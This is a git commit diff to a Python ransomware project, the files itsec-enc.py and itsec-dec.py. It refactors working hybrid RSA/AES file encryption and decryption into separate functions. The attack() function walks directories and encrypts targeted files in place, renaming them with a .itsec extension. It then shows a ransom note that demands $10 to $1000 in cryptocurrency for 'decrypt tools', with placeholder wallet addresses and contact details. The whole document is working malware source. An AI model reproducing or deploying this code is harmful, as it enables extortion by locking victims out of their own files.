7597d4f8cc279342e4fbb375d79c0de56a052ad6
shinau21 <bandingandesa@gmail.com>
2023-03-25 13:16:53 +0700

    Added encrypt & decrypt function

--- itsec-dec.py
+++ itsec-dec.py
@@ -5,35 +5,31 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-pvk = '''PRIVATE KEY'''
+pvk = '''YOUR PRIVATE KEY'''
+
+def decrypt(filename):
+    with open(filename, "rb") as file:
+        private_key = RSA.import_key(pvk)
+        enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
+        # Decrypt the session key with the private RSA key
+        cipher_rsa = PKCS1_OAEP.new(private_key)
+        session_key = cipher_rsa.decrypt(enc_session_key)
+        # Decrypt the data with the AES session key
+        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
+        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
+
+    with open(filename, "wb") as file:
+        file.write(data)
+
 
 def defense(target):
     for p, d, f in os.walk(target):
         for name in f:
             if name.endswith((".itsec")):
                 try:
-                    #encrypt(os.path.join(p, name),RSA.importKey(pbk))
-
-                    with open(p + name, "rb") as mfile:
-                        newFile = p + os.path.splitext(name)[0]
-                        file_in = open(newFile, "wb")
-
-                        private_key = RSA.import_key(pvk)
-
-                        enc_session_key, nonce, tag, ciphertext = [ mfile.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
-                        mfile.close()
-
-                        # Decrypt the session key with the private RSA key
-                        cipher_rsa = PKCS1_OAEP.new(private_key)
-                        session_key = cipher_rsa.decrypt(enc_session_key)
-
-                        # Decrypt the data with the AES session key
-                        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
-                        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
-                        file_in.write(data)
-                        file_in.close()
-                        mfile.close()
-                        os.remove(os.path.join(p, name))
+                    decrypt(os.path.join(p, name))
+                    newFile = os.path.splitext(name)[0]
+                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
                 try:
--- itsec-enc.py
+++ itsec-enc.py
@@ -7,15 +7,35 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-url_web = "YOUR URL PUBLIC KEY"
-url_list = []
+url_web = "Your Url Publilc Key"
+url_list = ["List of key"]
 URL_KEY = url_web + random.choice(url_list)
 pbk = req.get(URL_KEY).text
 lcx = URL_KEY.split('/')[3].split('.')[0]
 
-WALLET_ADDRESS ='''YOUR WALLET ADDRESS'''
+WALLET_ADDRESS = '''
+BTC_ADDRESS  : 
+TRX_ADDRESS  : 
+BUSD_ADDRESS : 
+'''
+CONTACT = '''Your Contact'''
 
-CONTACT = '''CONTACT HERE'''
+
+def encrypt(filename):
+    with open(filename, "rb") as file:
+        file_data = file.read()
+        recipient_key = RSA.importKey(pbk)
+        session_key = get_random_bytes(16)
+
+        # Encrypt the session key with the public RSA key
+        cipher_rsa = PKCS1_OAEP.new(recipient_key)
+        enc_session_key = cipher_rsa.encrypt(session_key)
+        
+        # Encrypt the data with the AES session key
+        cipher_aes = AES.new(session_key, AES.MODE_EAX)
+        ciphertext, tag = cipher_aes.encrypt_and_digest(file_data)
+    with open(filename, "wb") as file:
+        [ file.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
 
 def attack(target):
 
@@ -25,25 +45,9 @@ def attack(target):
         for name in f:
             if name.endswith((fl)):
                 try:
-                    with open(p + name, "rb") as mfile:
-                        data = mfile.read()
-                        newFile = os.path.join(p, name) +  ".itsec"
-                        file_out = open(newFile, "wb")
-
-                        recipient_key = RSA.importKey(pbk)
-                        session_key = get_random_bytes(16)
-
-                        # Encrypt the session key with the public RSA key
-                        cipher_rsa = PKCS1_OAEP.new(recipient_key)
-                        enc_session_key = cipher_rsa.encrypt(session_key)
-
-                        # Encrypt the data with the AES session key
-                        cipher_aes = AES.new(session_key, AES.MODE_EAX)
-                        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
-                        [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
-                        file_out.close()
-                        mfile.close()
-                        os.remove(os.path.join(p, name))
+                    encrypt(os.path.join(p, name))
+                    newFile = name +  ".itsec"
+                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
 
@@ -57,8 +61,7 @@ def attack(target):
                 If you want to back your file, you can buy my decrypt tools
                 Price of decrypt tools is $10 - $1000 depend on large files''' + '''
 
-                Choice one payment'''
-                + WALLET_ADDRESS + '''
+                Choice one payment\n'''+ WALLET_ADDRESS + '''
                 
                 Your Personal Key is : ''' + lcx + '''
 
